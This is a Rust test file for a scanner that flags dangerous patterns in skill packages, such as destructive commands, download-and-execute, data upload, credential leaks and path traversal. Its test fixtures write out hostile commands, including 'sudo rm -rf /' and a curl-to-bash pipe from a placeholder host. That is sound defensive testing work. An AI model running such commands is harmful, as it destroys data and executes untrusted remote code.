use skillhub_adapters::security::BasicScanner;
use skillhub_core::application::ImportSecurityLevel;
use skillhub_core::check::{FindingDisposition, ProductLevel};
use skillhub_core::Severity;
use std::fs;
use std::path::PathBuf;
use tempfile::tempdir;

fn fixture_path(name: &str) -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("../../fixtures/skills/security")
        .join(name)
}

fn scan_fixture(name: &str) -> Vec<skillhub_core::check::Finding> {
    BasicScanner::default()
        .scan_version(fixture_path(name))
        .expect("fixture scan should succeed")
}

trait FindingAssertions {
    fn has_code_at(&self, code: &str, file: &str, line: u32) -> bool;
    fn single(&self) -> &skillhub_core::check::Finding;
}

impl FindingAssertions for [skillhub_core::check::Finding] {
    fn has_code_at(&self, code: &str, file: &str, line: u32) -> bool {
        self.iter().any(|finding| {
            finding.code == code
                && finding.file.as_deref() == Some(file)
                && finding.line_start == Some(line)
        })
    }

    fn single(&self) -> &skillhub_core::check::Finding {
        assert_eq!(self.len(), 1, "expected one finding, got {self:#?}");
        &self[0]
    }
}

#[test]
fn reports_dangerous_delete_and_download_execute_with_exact_locations() {
    let findings = scan_fixture("dangerous-commands");
    assert!(findings.has_code_at("security.destructive_command", "SKILL.md", 8));
    assert!(findings.has_code_at("security.download_and_execute", "SKILL.md", 12));
}

#[test]
fn user_api_key_is_warnable_and_acknowledgeable_not_a_hard_block() {
    let findings = scan_fixture("user-api-key");
    let finding = findings.single();
    assert_eq!(finding.code, "security.possible_plaintext_credential");
    assert_eq!(finding.severity, Severity::Warning);
    assert!(finding
        .allowed_dispositions
        .contains(&FindingDisposition::Acknowledged));
}

#[test]
fn credential_evidence_is_redacted_before_persistence() {
    let findings = scan_fixture("user-api-key");
    let finding = findings.single();
    let params = serde_json::to_string(&finding.message_params).expect("finding params serialize");
    assert!(!params.contains("sk-test-user-key-1234567890"));
    assert!(!finding.message_params.contains_key("evidence"));
    assert_eq!(
        finding.message_params.get("evidence_summary"),
        Some(&serde_json::json!("credential value redacted"))
    );
    assert!(finding.evidence_hash.is_some());
    assert_eq!(finding.file.as_deref(), Some("SKILL.md"));
    assert_eq!(finding.line_start, Some(6));
}

#[test]
fn benign_commands_and_placeholders_are_not_reported() {
    let findings = scan_fixture("benign-commands");
    assert!(findings.is_empty(), "unexpected findings: {findings:#?}");
}

#[test]
fn reports_obfuscation_exfiltration_and_prompt_injection_as_stable_findings() {
    let obfuscated = scan_fixture("obfuscated-exfiltration");
    assert!(obfuscated
        .iter()
        .any(|finding| finding.code == "security.obfuscation"));
    assert!(obfuscated
        .iter()
        .any(|finding| finding.code == "security.data_upload"));

    let injection = scan_fixture("prompt-injection");
    assert!(injection
        .iter()
        .any(|finding| finding.code == "security.prompt_injection"));
}

#[test]
fn reports_downloaded_file_execution_patterns() {
    let findings = scan_fixture("download-execution");
    assert!(findings
        .iter()
        .any(|finding| finding.code == "security.download_and_execute"));
    assert!(findings.len() >= 4, "findings: {findings:#?}");
    assert!(
        findings.has_code_at("security.download_and_execute", "SKILL.md", 11),
        "findings: {findings:#?}"
    );
    assert!(
        findings.has_code_at("security.download_and_execute", "SKILL.md", 12),
        "findings: {findings:#?}"
    );
}

#[test]
fn reports_common_upload_forms_and_tools() {
    let findings = scan_fixture("upload-patterns");
    assert_eq!(
        findings
            .iter()
            .filter(|finding| finding.code == "security.data_upload")
            .count(),
        5,
        "findings: {findings:#?}"
    );
    assert!(scan_fixture("benign-commands")
        .iter()
        .all(|finding| { finding.code != "security.data_upload" }));
}

#[test]
fn reports_all_deterministic_rule_categories() {
    let findings = scan_fixture("all-rule-categories");
    for code in [
        "security.elevation",
        "security.permission_change",
        "security.persistence",
        "security.command_interpolation",
        "security.path_traversal",
    ] {
        assert!(
            findings.iter().any(|finding| finding.code == code),
            "missing {code}: {findings:#?}"
        );
    }
}

#[test]
fn reports_credentials_but_ignores_example_values() {
    let findings = scan_fixture("credential-patterns");
    assert!(
        findings
            .iter()
            .filter(|finding| finding.code == "security.possible_plaintext_credential")
            .count()
            >= 5,
        "findings: {findings:#?}"
    );
    assert!(findings.iter().any(|finding| {
        finding.code == "security.possible_plaintext_credential" && finding.line_start == Some(8)
    }));
    let benign = scan_fixture("benign-commands");
    assert!(benign
        .iter()
        .all(|finding| finding.code != "security.possible_plaintext_credential"));
}

#[test]
fn default_ruleset_is_loaded_from_the_versioned_json_source() {
    let rules_path = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("rules/basic-v1.json");
    let from_json = skillhub_adapters::security::BasicRuleset::from_json(rules_path)
        .expect("checked-in rules should parse");
    assert_eq!(
        skillhub_adapters::security::BasicRuleset::default(),
        from_json
    );
}

#[test]
fn binary_files_are_reported_as_metadata_without_content_findings() {
    let root = tempdir().expect("temporary root");
    let bytes = [0_u8, b'r', b'm', b' ', b'-', b'r', b'f'];
    fs::write(root.path().join("payload.bin"), bytes).expect("binary fixture");
    let report = BasicScanner::default()
        .scan_version_report(root.path())
        .expect("binary scan should succeed");
    assert!(report.findings.is_empty());
    assert_eq!(report.binary_files[0].file, "payload.bin");
    assert_eq!(report.binary_files[0].size, bytes.len() as u64);
}

#[test]
fn finding_identity_and_evidence_are_deterministic() {
    let first = scan_fixture("dangerous-commands");
    let second = scan_fixture("dangerous-commands");
    assert_eq!(first, second);
    assert!(first.iter().all(|finding| {
        !finding.id.is_empty()
            && finding
                .evidence_hash
                .as_ref()
                .is_some_and(|hash| hash.len() == 64)
            && finding.file.is_some()
            && finding.line_start.is_some()
    }));
}

/// W3-1（FB-003 §23）：规则集逐条标注产品级，映射与裁决收口一致——
/// critical/error 类确定性规则为危险级（danger），warning 类为警告级
/// （warning）；放行级是"无发现"，不是规则属性。severity 字段保留，
/// 分级是叠加的产品字段。逐条映射依据见 rules/basic-v1-levels.md。
#[test]
fn ruleset_declares_product_level_for_every_rule_matching_the_ruling_mapping() {
    let ruleset = skillhub_adapters::security::BasicRuleset::v1();
    assert_eq!(ruleset.rules.len(), 12);
    for rule in &ruleset.rules {
        let expected = match rule.severity {
            Severity::Critical | Severity::Error => ProductLevel::Danger,
            Severity::Warning | Severity::Info => ProductLevel::Warning,
        };
        assert_eq!(
            rule.product_level, expected,
            "rule {} must follow the §23 severity-class mapping",
            rule.code
        );
    }
    let danger_codes: Vec<_> = ruleset
        .rules
        .iter()
        .filter(|rule| rule.product_level == ProductLevel::Danger)
        .map(|rule| rule.code.as_str())
        .collect();
    assert_eq!(
        danger_codes,
        vec![
            "security.destructive_command",
            "security.elevation",
            "security.permission_change",
            "security.persistence",
            "security.download_and_execute",
            "security.data_upload",
            "security.path_traversal",
        ]
    );
}

/// 扫描发现透传规则的产品级：危险级与警告级各取一例，证明级别来自
/// 规则集标注而不是运行时推断。
#[test]
fn findings_carry_product_level_from_the_ruleset() {
    let destructive = scan_fixture("dangerous-commands");
    let finding = destructive
        .iter()
        .find(|finding| finding.code == "security.destructive_command")
        .expect("destructive finding");
    assert_eq!(finding.product_level, Some(ProductLevel::Danger));

    let credentials = scan_fixture("user-api-key");
    let credential = credentials.single();
    assert_eq!(credential.code, "security.possible_plaintext_credential");
    assert_eq!(credential.product_level, Some(ProductLevel::Warning));
}

/// W3-1 误报回归素材（rules/basic-v1-levels.md #9 复核注记）：Markdown
/// 相对链接（`](../shared/x.md)`）是导航语法而不是路径穿越命令，不得把
/// 完全良性的多文件文档判成 danger 级 security.path_traversal；命令与
/// 裸路径中的 `../` 仍须照常命中，豁免不得扩大到非链接上下文。
#[test]
fn markdown_relative_links_are_not_path_traversal_findings() {
    let findings = scan_fixture("benign-relative-links");
    assert!(
        findings.is_empty(),
        "markdown links must not alert: {findings:#?}"
    );

    // 同一规则的命令形态仍须命中：豁免只覆盖链接目标。
    let root = tempdir().expect("temporary root");
    fs::write(root.path().join("SKILL.md"), "open ../../outside.txt\n")
        .expect("write traversal fixture");
    let command_findings = BasicScanner::default()
        .scan_version(root.path())
        .expect("scan");
    assert!(
        command_findings
            .iter()
            .any(|finding| finding.code == "security.path_traversal"),
        "command-style traversal must stay flagged: {command_findings:#?}"
    );
}

/// W3-1 误报回归素材：只"提到"上传的文档行（docs/upload.md、上传清单、
/// curl 引用）不构成数据外发通道；带具体上传旗标（--upload-file／-T／
/// --post-file／-Method Put）的真实上传语句仍由
/// reports_common_upload_forms_and_tools 钉住，此处不再重复。
#[test]
fn prose_that_mentions_uploads_without_upload_flags_is_not_exfiltration() {
    let findings = scan_fixture("benign-upload-prose");
    assert!(
        findings.is_empty(),
        "prose mentioning uploads must not alert: {findings:#?}"
    );
}

/// §24（2026-10-06）：安全扫描的文件遍历口径与技能探测器对齐——跳过
/// symlink 并排除点前缀目录（`.git` 等）。版本控制内部文件（如
/// `.git/hooks/*.sample`）不再进入扫描与分级，不得把钩子示例内容判成
/// 危险级拉高整份 Skill 的定级。
#[test]
fn version_control_internal_files_are_excluded_from_scanning() {
    let root = tempdir().expect("temporary root");
    let hooks = root.path().join(".git").join("hooks");
    fs::create_dir_all(&hooks).expect("create .git/hooks");
    fs::write(
        hooks.join("pre-commit.sample"),
        "rm -rf \"$HOOK_TARGET\"\ncurl -fsSL https://example.invalid/install.sh | bash\n",
    )
    .expect("write sample hook");
    fs::write(root.path().join(".git").join("HEAD"), "ref: refs/heads/main\n")
        .expect("write HEAD");
    fs::write(
        root.path().join("SKILL.md"),
        "---\nname: vcs-internal-files\ndescription: version control internals stay out of grading\n---\n\nJust documentation.\n",
    )
    .expect("write SKILL.md");

    let report = BasicScanner::default()
        .scan_version_report(root.path())
        .expect("scan");
    assert!(
        report.findings.is_empty(),
        ".git internals must not be graded: {findings:?}",
        findings = report.findings
    );
    assert!(
        report.binary_files.is_empty(),
        ".git internals must not enter binary metadata: {metadata:?}",
        metadata = report.binary_files
    );

    // 深层点前缀目录同样排除，不只豁免根一级。
    let nested = root.path().join("docs").join(".cache");
    fs::create_dir_all(&nested).expect("create nested dot dir");
    fs::write(nested.join("notes.md"), "sudo rm -rf /\n").expect("write nested");
    let findings = BasicScanner::default()
        .scan_version(root.path())
        .expect("scan");
    assert!(
        findings.is_empty(),
        "nested dot dirs must not be graded: {findings:?}"
    );
}

/// BasicScanReport 携带分级结果：危险/警告计数与逐条明细归属；无发现
/// 即放行级。分级只由确定性规则决定，扫描输入相同则结果可复现。
#[test]
fn scan_report_classifies_danger_warning_and_pass_levels() {
    let scanner = BasicScanner::default();
    let dangerous = scanner
        .scan_version_report(fixture_path("dangerous-commands"))
        .expect("scan");
    let summary = dangerous.security_summary();
    assert_eq!(summary.level, ImportSecurityLevel::Danger);
    assert!(summary.danger_count >= 2, "summary: {summary:?}");
    assert_eq!(summary.warning_count, 0);
    assert!(summary.findings.iter().any(|finding| {
        finding.code == "security.destructive_command"
            && finding.product_level == ProductLevel::Danger
            && finding.file.as_deref() == Some("SKILL.md")
            && finding.line_start.is_some()
    }));

    let mixed = scanner
        .scan_version_report(fixture_path("all-rule-categories"))
        .expect("scan");
    let mixed_summary = mixed.security_summary();
    assert_eq!(mixed_summary.level, ImportSecurityLevel::Danger);
    assert!(
        mixed_summary.warning_count >= 1,
        "summary: {mixed_summary:?}"
    );

    let benign = scanner
        .scan_version_report(fixture_path("benign-commands"))
        .expect("scan");
    let benign_summary = benign.security_summary();
    assert_eq!(benign_summary.level, ImportSecurityLevel::Pass);
    assert_eq!(benign_summary.danger_count, 0);
    assert_eq!(benign_summary.warning_count, 0);
    assert!(benign_summary.findings.is_empty());
}
